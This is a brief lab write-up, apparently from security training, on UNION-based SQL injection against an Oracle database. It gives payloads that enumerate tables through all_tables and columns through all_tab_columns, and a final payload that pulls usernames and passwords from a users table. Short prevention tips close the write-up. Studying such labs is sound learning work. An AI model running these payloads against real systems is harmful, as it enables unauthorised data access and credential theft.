## 🧪 SQL Injection – Listing Database Contents (Oracle)

## 📌 Lab: Extract Tables & Columns

### 🎯 Objective

List database tables and columns

---

### 🔍 Vulnerability Type

SQL Injection (UNION-based)

---

### ⚙️ Steps Performed

1. Found table names:

```sql
' UNION SELECT table_name, NULL FROM all_tables --
```

2. Found columns:

```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS' --
```

---

### 💉 Payload Used

```sql
' UNION SELECT username, password FROM users --
```

---

### 🧠 Explanation

* `all_tables` → list tables
* `all_tab_columns` → list columns

---

### 📸 Proof of Concept



---

### ✅ Result

Extracted usernames and passwords.

---

### 🛡️ Prevention

* Limit DB permissions
* Avoid exposing metadata
* Use secure queries

---

### 📚 Learning Outcome

* Learned database enumeration
* Understood Oracle metadata tables
